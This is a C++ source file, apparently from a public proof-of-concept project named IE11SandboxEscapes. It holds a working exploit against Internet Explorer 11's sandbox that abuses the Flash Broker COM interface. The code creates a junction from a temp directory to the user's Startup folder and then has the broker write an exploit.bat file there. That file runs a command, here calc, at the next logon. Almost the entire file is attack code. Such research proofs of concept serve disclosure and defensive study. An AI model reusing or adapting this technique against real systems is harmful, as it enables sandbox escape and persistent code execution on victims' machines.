// This file is part of IE11SandboxEsacapes.

// IE11SandboxEscapes is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// IE11SandboxEscapes is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with IE11SandboxEscapes.  If not, see <http://www.gnu.org/licenses/>.

#include "stdafx.h"

#pragma comment(lib, "shlwapi.lib")

HRESULT BrokerWriteFile(IFlashBroker5* pUnk, const bstr_t& path, const std::vector<unsigned char>& buf)
{
	HRESULT hr = E_FAIL;
	unsigned long cookie;

	hr = pUnk->BrokerCreateFile(path, 0, 1, &cookie);

	if (hr == S_OK)
	{
		SAFEARRAY* psa = SafeArrayFromVector(buf);
		unsigned long written = 0;

		hr = pUnk->BrokerWriteFile(cookie, psa, &written);

		pUnk->BrokerCloseHandle(cookie);

		SafeArrayDestroy(psa);
	}
	else
	{
		DebugPrintf("Failed to create file %08X %ls\n", hr, (const wchar_t*)path);
	}	

	return hr;
}


bstr_t GetStartupDirectory()
{
	LPWSTR lpRet = nullptr;

	if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, nullptr, &lpRet)))
	{
		bstr_t r = lpRet;
		CoTaskMemFree(lpRet);

		return r;
	}

	return L"";
}

void DoFlashBrokerExploitJunction()
{
	CLSID clsid;
	HRESULT hr;

	CLSIDFromString(L"{73c9dfa0-750d-11e1-b0c4-0800200c9a66}", &clsid);

	IFlashBroker5* pUnk;

	hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER | CLSCTX_ACTIVATE_32_BIT_SERVER, IID_PPV_ARGS(&pUnk));
	if (SUCCEEDED(hr))
	{
		DebugPrintf("Created Broker: %p\n", pUnk);

		bstr_t tempDir = GetTempDir();

		tempDir = tempDir + L"dummy_junction";

		CreateDirectoryW(tempDir, nullptr);

		FSLinks::DeleteJunctionPoint(tempDir);

		bstr_t baseDir = GetStartupDirectory();

		if (FSLinks::CreateJunctionPoint(tempDir, baseDir))
		{		
			char data[] = "calc\r\n";
			std::vector<unsigned char> buf;

			buf.resize(strlen(data));
			memcpy(&buf[0], data, buf.size());

			BrokerWriteFile(pUnk, tempDir + L"\\exploit.bat", buf);			
		}
		else
		{
			DebugPrintf("Failed to create junction\n");
		}

		RemoveDirectoryW(tempDir);
		pUnk->Release();
	}
	else
	{
		DebugPrintf("Failed to create broker: %08X\n", hr);
	}
}

DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	CoInitialize(nullptr);

	try
	{
		DoFlashBrokerExploitJunction();
	}
	catch (_com_error& e)
	{
		DebugPrintf("Error: %ls\n", e.ErrorMessage());
	}

	CoUninitialize();

	FreeLibraryAndExitThread((HMODULE)hModule, 0);	
}